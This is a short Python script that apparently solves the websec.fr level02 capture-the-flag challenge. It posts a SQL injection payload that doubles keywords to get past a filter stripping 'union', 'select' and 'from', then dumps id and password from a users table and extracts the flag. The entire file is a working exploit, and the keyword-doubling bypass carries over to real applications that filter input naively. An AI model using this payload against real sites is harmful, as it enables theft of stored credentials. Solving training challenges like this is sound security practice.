import requests
import re


if __name__ == '__main__':
    sess = requests.Session()
    url = 'http://websec.fr/level02/index.php'
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0'}
    proxies = {'http': 'http://localhost:8080', 'https': 'https://localhost:8080'}

    sess.headers.update(headers)
    sess.proxies.update(proxies)

    res = sess.get(url=url)
    attack_sig = '1 uniunionon seselectlect id,password frofromm users; -- '

    data = {'user_id': attack_sig, 'submit': '送信'}
    res = sess.post(url=url, data=data)

    pattern = r'WEBSEC{[^}]+}'
    match = re.search(pattern, res.text)

    if match:
        print('[+]FLAG is', match.group())
